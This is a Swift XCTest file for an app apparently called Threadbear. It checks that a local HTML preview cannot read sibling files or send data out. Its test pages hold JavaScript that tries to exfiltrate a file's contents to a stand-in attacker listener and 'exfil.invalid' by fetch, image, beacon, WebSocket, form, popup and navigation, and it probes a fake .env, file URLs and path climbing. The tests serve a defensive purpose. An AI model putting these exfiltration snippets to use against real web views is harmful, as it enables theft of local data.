import Network
import WebKit
import XCTest
@testable import Threadbear
@testable import ThreadbearCore

/// Daybreak finding 6, in a real web view: a local HTML preview served by
/// the pool's scheme handler can load the style and picture it names, and
/// can't read a file beside it, by fetch, by file URL or by a picture's name.
@MainActor
final class LocalPreviewTests: XCTestCase {
    private var dir: URL!

    override func setUpWithError() throws {
        dir = FileManager.default.temporaryDirectory.appendingPathComponent("LocalPreviewTests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: dir)
    }

    private func write(_ name: String, _ data: Data) throws {
        try data.write(to: dir.appendingPathComponent(name))
    }

    /// A 1x1 PNG.
    private let png = Data(base64Encoded: "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==")!

    /// A server on this Mac standing in for an attacker's: counts every
    /// connection, so a test can see that nothing reached it.
    private final class Listener: @unchecked Sendable {
        let listener: NWListener
        private let lock = NSLock()
        private var _hits = 0
        private var _requests: [String] = []
        var hits: Int { lock.withLock { _hits } }
        /// Each request's first line, to say which way out was found.
        var requests: [String] { lock.withLock { _requests } }
        var port: UInt16 { listener.port?.rawValue ?? 0 }

        init() throws {
            listener = try NWListener(using: .tcp, on: .any)
            listener.newConnectionHandler = { [weak self] connection in
                self?.lock.withLock { self?._hits += 1 }
                connection.start(queue: .global())
                connection.receive(minimumIncompleteLength: 1, maximumLength: 4096) { data, _, _, _ in
                    let line = data.flatMap { String(data: $0, encoding: .utf8)?.components(separatedBy: "\r\n").first } ?? "(nothing)"
                    self?.lock.withLock { self?._requests.append(line) }
                    connection.send(content: Data("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n".utf8), completion: .contentProcessed { _ in connection.cancel() })
                }
            }
        }

        func start() async throws {
            listener.start(queue: .global())
            for _ in 0..<50 where listener.port == nil || listener.state != .ready { try await Task.sleep(for: .milliseconds(20)) }
        }

        deinit { listener.cancel() }
    }

    /// The verify-fix round: a page that reads a file beside it, by naming it
    /// in its own markup so the allowlist lets it in, still gets nothing out.
    /// Every way out is tried against a server on this Mac, and none reaches it.
    func testAPreviewCanSendNothingOut() async throws {
        let server = try Listener()
        try await server.start()
        // Loopback, which skips proxies, so only the rule list, the policy
        // and the link guard stand between the page and this server.
        let host = "127.0.0.1"
        let out = "http://\(host):\(server.port)"
        // And a named host, which goes to the preview's proxy: here a second
        // listener, standing in for the closed port the app uses.
        let sink = try Listener()
        try await sink.start()
        let named = "http://exfil.invalid:\(server.port)"
        // Sanity: the server answers outside the preview.
        let (_, response) = try await URLSession.shared.data(from: URL(string: out + "/ping")!)
        XCTAssertEqual((response as? HTTPURLResponse)?.statusCode, 200)
        try await Task.sleep(for: .milliseconds(100))
        let before = server.hits
        XCTAssertGreaterThan(before, 0)

        try write("private.html", Data("<p>the secret</p>".utf8))
        try write("index.html", Data("""
        <!doctype html><html><body>
        <iframe src="private.html" id="f"></iframe>
        <a id="away" href="\(out)/clicked">away</a>
        <form id="form" method="post" action="\(out)/form"><input name="d" value="x"></form>
        <script>
        window.results = null;
        window.addEventListener('load', async () => {
          const r = {};
          try { r.secret = await (await fetch('private.html')).text(); } catch (e) { r.secret = 'none'; }
          const d = encodeURIComponent(r.secret);
          new Image().src = '\(out)/img?d=' + d;
          try { await fetch('\(out)/fetch?d=' + d, { mode: 'no-cors' }); r.fetch = 'sent'; } catch (e) { r.fetch = 'blocked'; }
          try { navigator.sendBeacon('\(out)/beacon', d); } catch (e) {}
          try { new WebSocket('ws://\(host):\(server.port)/ws'); } catch (e) {}
          const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = '\(out)/css?d=' + d; document.head.appendChild(link);
          try { window.open('\(out)/popup?d=' + d); } catch (e) {}
          r.rtc = typeof RTCPeerConnection;
          window.results = r;
          const far = document.createElement('a'); far.href = '\(named)/clicked?d=' + d; document.body.appendChild(far);
          new Image().src = '\(named)/img?d=' + d;
          try { await fetch('\(named)/fetch?d=' + d, { mode: 'no-cors' }); } catch (e) {}
          setTimeout(() => far.click(), 500);
          setTimeout(() => document.getElementById('away').click(), 1000);
          setTimeout(() => document.getElementById('form').submit(), 2000);
          setTimeout(() => { location.href = '\(out)/location?d=' + d; }, 3000);
        });
        </script></body></html>
        """.utf8))

        let pool = WebPanelPool(defaults: UserDefaults(suiteName: "LocalPreviewTests.\(UUID().uuidString)")!)
        pool.previewProxy = .hostPort(host: "127.0.0.1", port: NWEndpoint.Port(rawValue: sink.port)!)
        let view = pool.webView(for: dir.appendingPathComponent("index.html"))
        var results: [String: Any]?
        for _ in 0..<100 {
            try await Task.sleep(for: .milliseconds(100))
            if let got = try? await view.evaluateJavaScript("window.results") as? [String: Any] { results = got; break }
        }
        let r = try XCTUnwrap(results, "the page never finished")
        // It could read the file it named (that's what the allowlist is for)...
        XCTAssertEqual(r["secret"] as? String, "<p>the secret</p>")
        XCTAssertEqual(r["fetch"] as? String, "blocked")
        XCTAssertEqual(r["rtc"] as? String, "undefined", "WebRTC goes round the proxy")
        // ...but after the click, the form and the location change have all had their turn,
        try await Task.sleep(for: .seconds(4))
        // nothing reached the server, and the page is still the preview.
        XCTAssertEqual(server.hits, before, "a request got out of the preview: \(server.requests)")
        // At most a bare CONNECT reached the proxy (a closed port in the app),
        // never a request with the page's data in it.
        XCTAssertTrue(sink.requests.allSatisfy { $0.hasPrefix("CONNECT ") && !$0.contains("secret") }, "\(sink.requests)")
        XCTAssertFalse(sink.requests.contains { $0.contains("?d=") })
        XCTAssertEqual(view.url?.scheme, LocalPreviewSchemeHandler.scheme)
        XCTAssertEqual(view.url?.lastPathComponent, "index.html")
    }

    func testAPreviewLoadsWhatItNamesAndNothingBesideIt() async throws {
        try write("style.css", Data("body { color: rgb(1, 2, 3); }".utf8))
        try write("pic.png", png)
        try write("secret.png", png)
        try write(".env", Data("SECRET=hunter2".utf8))
        try write("notes.txt", Data("private".utf8))
        // The secret's names are built at run time, so the page never names them.
        try write("index.html", Data("""
        <!doctype html><html><head><link rel="stylesheet" href="style.css"></head><body>
        <img id="pic" src="pic.png">
        <script>
        const dot = '.', n = (a, b) => a + b;
        async function tryRead(path) {
          try { const r = await fetch(path); return r.ok ? 'read:' + (await r.text()) : 'refused:' + r.status; }
          catch (e) { return 'refused:error'; }
        }
        function tryPicture(path) {
          return new Promise(done => { const i = new Image(); i.onload = () => done('read'); i.onerror = () => done('refused'); i.src = path; });
        }
        window.results = null;
        window.addEventListener('load', async () => {
          window.results = {
            env: await tryRead(dot + 'env'),
            notes: await tryRead(n('notes', '.txt')),
            fileURL: await tryRead('file://' + \(String(reflecting: dir.path)) + '/' + dot + 'env'),
            secretPicture: await tryPicture(n('secret', '.png')),
            climb: await tryRead(n('..', '/') + 'x.png'),
            picture: document.getElementById('pic').naturalWidth,
            color: getComputedStyle(document.body).color,
          };
        });
        </script></body></html>
        """.utf8))

        let pool = WebPanelPool(defaults: UserDefaults(suiteName: "LocalPreviewTests.\(UUID().uuidString)")!)
        let view = pool.webView(for: dir.appendingPathComponent("index.html"))
        var results: [String: Any]?
        for _ in 0..<100 {
            try await Task.sleep(for: .milliseconds(100))
            if let got = try? await view.evaluateJavaScript("window.results") as? [String: Any] { results = got; break }
        }
        let r = try XCTUnwrap(results, "the page never finished")
        XCTAssertEqual(view.url?.scheme, LocalPreviewSchemeHandler.scheme)
        // Its own style and picture still load.
        XCTAssertEqual(r["color"] as? String, "rgb(1, 2, 3)")
        XCTAssertEqual((r["picture"] as? NSNumber)?.intValue, 1)
        // Nothing beside it.
        XCTAssertEqual(r["env"] as? String, "refused:404")
        XCTAssertEqual(r["notes"] as? String, "refused:404")
        XCTAssertEqual(r["secretPicture"] as? String, "refused")
        XCTAssertEqual(r["climb"] as? String, "refused:404")
        XCTAssertEqual((r["fileURL"] as? String)?.hasPrefix("refused"), true)
    }
}
